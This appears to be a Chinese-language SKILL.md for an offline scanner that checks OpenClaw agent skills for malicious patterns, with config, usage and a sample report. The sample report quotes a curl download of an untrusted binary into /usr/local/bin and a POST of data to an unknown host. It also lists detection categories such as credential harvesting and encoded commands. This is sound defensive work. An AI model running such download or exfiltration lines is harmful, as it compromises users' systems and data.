---
name: security-scanner
description: 在安装之前，会扫描 OpenClaw 的技能（skills）以检测是否存在安全漏洞或可疑行为模式。
author: anikrahman0
version: 1.0.0
tags: [security, scanner, malware-detection, safety, validation]
license: MIT
---

# 安全扫描器

## 说明

这是一个专注于安全性的工具，用于分析 OpenClaw 的 SKILL.md 文件和技能包，以检测潜在的安全风险、恶意模式和可疑行为。该工具通过以下方式帮助保护您的系统：
- 检测隐藏的外部下载或可执行文件
- 监控可疑的 API 调用和端点
- 识别危险的文件系统操作
- 发现被混淆或编码的命令
- 检查不寻常的依赖项要求
- 识别已知的恶意模式

**为什么这很重要？** 随着最近在 ClawHub 上发现了 341 多个恶意技能，这个扫描器在安装任何技能之前提供了必要的安全保障。

## 特点

- ✅ **模式检测**：识别可疑的代码模式和行为
- ✅ **依赖项分析**：验证所需的依赖项和下载内容
- ✅ **API 端点验证**：检查可疑的外部连接
- ✅ **文件系统审计**：检测危险的文件操作
- ✅ **编码检测**：标记 Base64、十六进制及其他混淆尝试
- ✅ **风险评分**：分配风险等级（低、中、高、严重）
- ✅ **详细报告**：提供发现的详细解释
- ✅ **白名单支持**：配置受信任的域名和模式

## 前提条件

- Node.js 18 及以上版本（用于运行扫描器）
- 不需要外部 API 密钥
- 无需网络访问（可离线使用）

## 安装

```bash
# Clone or download the skill
git clone https://github.com/anikrahman0/security-skill-scanner.git

# Or install via ClawHub
clawhub install security-skill-scanner
```

## 配置

在您的 OpenClaw 目录下创建一个 `.security-scanner-config.json` 文件（可选）：

```json
{
  "whitelistedDomains": [
    "github.com",
    "api.openai.com",
    "api.anthropic.com",
    "raw.githubusercontent.com"
  ],
  "whitelistedCommands": [
    "npm install",
    "pip install"
  ],
  "strictMode": false
}
```

## 使用方法

### 扫描 SKILL.md 文件

```
User: "Scan the skill file at ~/Downloads/new-skill/SKILL.md for security issues"
Agent: [Runs security scan and reports findings]
```

### 安装前扫描

```
User: "Before installing the email-automation skill, scan it for security risks"
Agent: [Downloads and scans the skill, provides risk assessment]
```

### 批量扫描所有已安装的技能

```
User: "Scan all my installed OpenClaw skills for security issues"
Agent: [Scans all skills in ~/.openclaw/skills/ and generates report]
```

## 扫描内容

### 🔴 严重风险
- Shell 命令注入尝试
- 外部可执行文件下载（curl/wget 等工具）
- 可疑的 `eval()` 或 `exec()` 使用
-  credential 收集行为
- 已知的恶意软件签名

### 🟠 高风险
- 未经验证的外部 API 调用
- 对敏感目录的文件系统写入权限
- 使用 Base64 或十六进制编码的命令
- 请求未知域名
- 权限提升尝试

### 🟡 中等风险
- 大范围的文件系统读取权限
- 未使用 HTTPS 的网络请求
- 过多的依赖项
- 不寻常的依赖项请求
- 已弃用或存在漏洞的包

### 🟢 低风险
- 轻微的代码质量问题
- 缺少错误处理
- 文档不完整
- 非关键的警告

## 输出格式

```
=== Security Scan Report ===
Skill: email-automation
Scanned: 2024-02-09 14:30:22
Overall Risk: HIGH ⚠️

FINDINGS:
[CRITICAL] External Binary Download Detected
  Location: Line 45 in prerequisites
  Pattern: curl https://unknown-site.com/tool -o /usr/local/bin/helper
  Risk: This downloads and executes an external binary from an untrusted source
  Recommendation: DO NOT INSTALL - Manual verification required

[HIGH] Suspicious API Endpoint
  Location: Line 89 in execute()
  Pattern: POST to http://data-collector.xyz/log
  Risk: Sends data to unknown third-party server
  Recommendation: Review what data is being sent

[MEDIUM] Unencrypted Network Request
  Location: Line 102
  Pattern: HTTP instead of HTTPS
  Risk: Data transmitted without encryption
  Recommendation: Request HTTPS version

SUMMARY:
Total Issues: 3
Critical: 1
High: 1
Medium: 1
Low: 0

RECOMMENDATION: ❌ DO NOT INSTALL
This skill has critical security issues that pose significant risk to your system.
```

## 示例场景

### 场景 1：安全的技能
```
User: "Scan the weather-checker skill"
Agent: "✅ SAFE - No security issues detected. The skill uses standard API calls
       to api.weatherapi.com with proper HTTPS and no file system access."
```

### 场景 2：可疑的技能
```
User: "Should I install the productivity-helper skill?"
Agent: "⚠️ WARNING - This skill attempts to download an external binary and
       makes requests to an unknown domain. Risk Level: CRITICAL
       Recommendation: DO NOT INSTALL"
```

### 场景 3：轻微问题
```
User: "Analyze the note-taker skill"
Agent: "⚠️ CAUTION - Risk Level: LOW
       Found 2 minor issues:
       - Uses HTTP instead of HTTPS for icon download
       - Missing input validation on file paths
       These can likely be fixed. Consider contacting the author."
```

## 安全保障

该扫描器本身在设计时就考虑了安全性：
- ✅ **无需网络访问**：完全离线运行
- ✅ **无外部依赖**：仅使用 JavaScript/Node.js
- ✅ **只读模式**：从不修改被扫描的文件
- ✅ **无数据传输**：不向任何地方发送数据
- ✅ **开源代码**：所有代码均可审核
- ✅ **沙箱环境**：不会执行来自被扫描技能的代码

## 错误报告

该扫描器可能会误报某些合法的使用情况。常见的误报原因包括：
- **npm/pip 安装**：合法的包管理器可能会触发警告
- **GitHub URL**：原始的 GitHub 内容链接通常是安全的
- **配置文件**：修改配置文件的技能可能会被标记为可疑
- **日志文件**：创建日志文件可能会触发文件系统警告

请根据具体情况判断并审查被标记的项目。

## 限制

- 无法检测零日漏洞或新型攻击方式
- 可能会忽略复杂的混淆技术
- 需要人工判断来做出最终决定
- 无法扫描加密或编译后的代码
- 基于模式的检测可能存在误报

**此工具是一个有用的第一道防线，但不能替代仔细的审查。**

## 贡献方式

如果发现未被检测到的恶意模式，请提交问题或 Pull Request，提供以下信息：
- 恶意模式
- 使用该模式的示例技能
- 建议的检测方法

## 发展计划
- [ ] 基于机器学习的模式检测
- [ ] 与 VirusTotal API 集成（可选）
- [ ] 自动技能信誉检查
- [ ] 社区提供的恶意软件签名库
- [ ] 为 ClawHub.ai 提供浏览器扩展
- [ ] 为技能开发者集成持续集成/持续交付（CI/CD）

## 支持

- 报告问题：https://github.com/anikrahman0/security-skill-scanner/issues
- 建议改进：欢迎提交 Pull Request
- 安全相关问题：security@yourdomain.com

## 许可证

MIT 许可证——免费使用、修改和分发

## 免责声明

该工具提供最佳的安全扫描服务，但不能保证能检测到所有恶意代码。在安装任何技能之前，请务必仔细审查，尤其是那些需要系统级权限的技能。作者不对使用该工具或安装被扫描技能所导致的任何损害负责。

---

**记住：如果某个技能看起来过于完美或请求了不寻常的权限，那么它很可能是可疑的。如有疑问，请不要安装它。**